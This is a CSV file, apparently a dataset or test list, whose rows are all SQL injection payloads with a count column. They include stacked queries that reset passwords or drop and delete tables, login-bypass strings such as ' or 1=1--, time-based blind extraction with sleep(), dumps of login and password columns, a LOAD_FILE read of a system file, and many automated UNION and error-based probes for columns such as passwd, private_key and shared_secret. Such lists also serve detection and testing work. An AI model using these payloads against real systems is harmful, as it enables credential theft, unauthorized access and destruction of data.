column,num,,
123; update account_table set pw='pero' where uid='hoge' --,1,564.5,564
123; update account_table set pw='tehepero' where uid='hogehoge' --,1,102,102
123; update account_table set pw='aaaaa' where uid='111' --,1,,
123; update account_table set pw='pass' where uid='namae' --,1,,
123; update account_table set pw='password' where uid='admin' --,1,,
123; update account_table set pw='bbbbb' where uid='aaaaa' --,1,,
123; update account_table set pw='12345' where uid='12345' --,1,,
5; DROP TABLE members /* ,1,,
1; DROP TABLE users /* ,1,,
2; DROP TABLE tags /* ,1,,
14; DROP TABLE topics /* ,1,,
10; DROP TABLE comments /* ,1,,
10; DROP TABLE members /* ,1,,
10; DROP TABLE shops /* ,1,,
10; DROP TABLE users /* ,1,,
10; DROP TABLE texts /* ,1,,
; UPDATE addressbook SET address = '___',1,,
; UPDATE addressbook SET address = '',1,,
; UPDATE addressbook SET address = 'aaa',1,,
; UPDATE addressbook SET address = 'hogehoge',1,,
 exec id 1;delete from hoge;,1,,
 exec name 1;delete from users;,1,,
 exec title 1;delete from purcahse;,1,,
 exec name 1;delete from sample;,1,,
 exec name 1;delete from hoge;,1,,
 exec hoge 1;delete from pero;,1,,
 exec aaa 1;delete from bbb;,1,,
"SELECT if(substr((SELECT name FROM users LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1,,
"SELECT if(substr((SELECT description FROM gigs LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1,,
"SELECT if(substr((SELECT title FROM topics LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1,,
"SELECT if(substr((SELECT name FROM comments LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1,,
"SELECT if(substr((SELECT name FROM shops LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1,,
"SELECT if(substr((SELECT name FROM sample_table LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1,,
"SELECT if(substr((SELECT count FROM likes LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1,,
"SELECT if(substr((SELECT name FROM hogehoge LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1,,
"SELECT if(substr((SELECT name FROM  LIMIT 1 OFFSET 0),1,1) = 'a',sleep(3),null);",1,,
"SELECT if(substr((SELECT name FROM users LIMIT 1 OFFSET 0),1,1) = 'a',sleep(100),null);",1,,
"SELECT if(substr((SELECT email FROM members LIMIT 1 OFFSET 0),1,1) = 't',sleep(3),null);",1,,
SELECT 0x50 + 0x45,1,,
SELECT CHAR(0x95),1,,
SELECT CHAR(0x45),1,,
SELECT 0x66 + 0x66,1,,
SELECT 0x66 + 0x67,1,,
SELECT 0x66 + 0x68,1,,
SELECT login + '-' + password FROM users,1,,
SELECT login + '-' + password FROM admin_users,1,,
SELECT login + '-' + password FROM members ,1,,
"SELECT CONCAT(login, password) FROM members",1,,
"SELECT CONCAT(login, password) FROM users",1,,
"SELECT CONCAT(login, password) FROM admin_users",1,,
SELECT 0x457578 ,1,,
"SELECT CONCAT('0x',HEX('c:\\boot.ini'))
SELECT CONCAT('0x',HEX('c:\\boot.ini')) ",1,,
"SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))",1,,
SELECT LOAD_FILE(0x633A5C626F6F742E696E69) ,1,,
"select char(65, 66, 67)",1,,
"select extractvalue(char(30),concat(char(11,22),(select email from members limit 1 offset 0)));",1,,
"select extractvalue(char(60),concat(char(47,36),(select email from members limit 1 offset 0)));",1,,
"select extractvalue(char(6),concat(char(11,22),(select email from members limit 1 offset 0)));",1,,
"select extractvalue(char(60),concat(char(47,36),(select email from users limit 1 offset 0)));",1,,
"select extractvalue(char(60),concat(char(47,36),(select email from admin_users limit 1 offset 0)));",1,,
admin' --,1,,
admin' #,1,,
admin'/*,1,,
' or 1=1--,1,,
' or 1=1#,1,,
' or 1=1/*,1,,
') or '1'='1--,1,,
') or ('1'='1--,1,,
 UNION SELECT 1,1,,
1' or '1' = '1';--,1,,
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,IFNULL(CAST(column_name AS CHAR),0x20),0x626866616169,IFNULL(CAST(column_type AS CHAR),0x20),0x716a717a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6576656e74735f77616974735f73756d6d6172795f62795f696e7374616e6365 AND table_schema=0x706572666f726d616e63655f736368656d61-- Fuom",1,,
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,IFNULL(CAST(COUNT(*) AS CHAR),0x20),0x716a717a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6576656e74735f77616974735f73756d6d6172795f62795f696e7374616e6365 AND table_schema=0x706572666f726d616e63655f736368656d61-- qqHJ",1,,
"1' AND (SELECT 7063 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT REPEAT(0x34,1024)),0x716a717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'nRny'='nRny",1,,
"1' AND (SELECT 6500 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT REPEAT(0x32,512)),0x716a717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'ednv'='ednv",1,,
"1' AND (SELECT 8866 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT REPEAT(0x36,256)),0x716a717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'cSzS'='cSzS",1,,
"1' AND (SELECT 2551 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT REPEAT(0x38,128)),0x716a717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'uDRn'='uDRn",1,,
"1' AND (SELECT 5490 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT REPEAT(0x34,64)),0x716a717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'IOUg'='IOUg",1,,
"1' AND (SELECT 1606 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT REPEAT(0x32,32)),0x716a717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'UXrY'='UXrY",1,,
"1' AND (SELECT 2277 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT REPEAT(0x36,16)),0x716a717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'qdDJ'='qdDJ",1,,
"1' AND (SELECT 4909 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT REPEAT(0x38,8)),0x716a717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'pIUE'='pIUE",1,,
"1' AND (SELECT 1783 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6576656e74735f77616974735f73756d6d6172795f62795f696e7374616e6365 AND table_schema=0x706572666f726d616e63655f736368656d61),0x716a717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Ctbf'='Ctbf",1,,
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT aTEC FROM zsTX)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- utMa",1,,
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EbMN",1,,
"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yZpA",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT name FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vXTH",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT description FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- abXG",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT username FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GHii",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT type FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rNnQ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT title FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BsKY",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT userid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oLjC",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT group_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xizA",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT first_name FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- URgS",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT itemid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xIFe",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT category_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KddT",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT firstname FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NrCl",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT code FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LdoR",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pno FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CqCD",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nextval FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NoYE",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT hostid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rfdq",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT table_name FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GFKO",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LHVs",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT email FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uGQc",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT smtp_helo FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Lqfg",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT platformid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GWoo",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dept_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RKLY",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT album_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Furg",1,,
" 1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT key_ FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cBLn",1,,
" 1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT the FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gerl",1,,
" 1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT child_cfg FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ngKl",1,,
" 1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT jid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- AMrD",1,,
" 1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT platform FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Bqdt",1,,
" 1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT expression FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FvpB",1,,
" 1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT functionid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SRjJ",1,,
" 1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT smtp_server FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qMZc",1,,
" 1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT uid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fpKo",1,,
" 1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT clock FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- iKoh",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT alarmid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VTrv",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT alertid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gjzn",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT private_key FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WfMB",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT actionid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SHHP",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT triggerid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SaYO",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT triggertemplateid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JccN",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT local_spi FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CqTz",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT delay FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SlAP",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- lUyN",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mediaid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VCiF",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT peer_cfg FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KcOB",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT smtp_email FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Flsz",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT order_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- AhFD",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT shared_secret FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Inuq",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT itemtemplateid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fWwv",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT certificate FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pADF",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT insertid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gaPk",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT role_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TeQg",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT song_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IOWC",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT item_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pahI",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT product_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kDPz",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT blob_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HBiZ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT distip FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MjLe",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT artist_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qVCP",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT empno FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vNdH",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT customer_name FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PbQk",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT grade FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DCaP",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT branch_name FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EamC",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT portal_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LWmz",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT deptno FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xUzC",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT data FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dQDI",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT rid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qnSx",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT app_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Comi",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT class FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kDWx",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT loan_number FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vtMh",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT countryid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RpFC",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT enabled FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mRUa",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT fname FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LPLa",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT country FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- AyDX",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ename FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JAZh",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT object_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- faoH",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT idtype FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wxMW",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT groupid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HUvs",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT rowid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rvkd",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT accno FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yzhP",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT account_number FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RHwO",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT event FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LxWy",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT passwd FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WwZZ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sequence_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EaGr",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT datarow FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Wipn",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT owner_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LAFS",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT display FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aHSo",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LyGO",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT venue FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LLxl",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT locked FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YWBk",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT eno FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KTdO",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT serviceid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uQBn",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT alias FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OWAO",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT categoryid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GUbw",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT canoccupantsinvite FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SzYN",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT keyword FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OKAP",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT channel_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uTJG",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT loginrestrictedtonickname FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- enqY",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT registrationenabled FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TYiZ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT logenabled FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oSyV",1,,
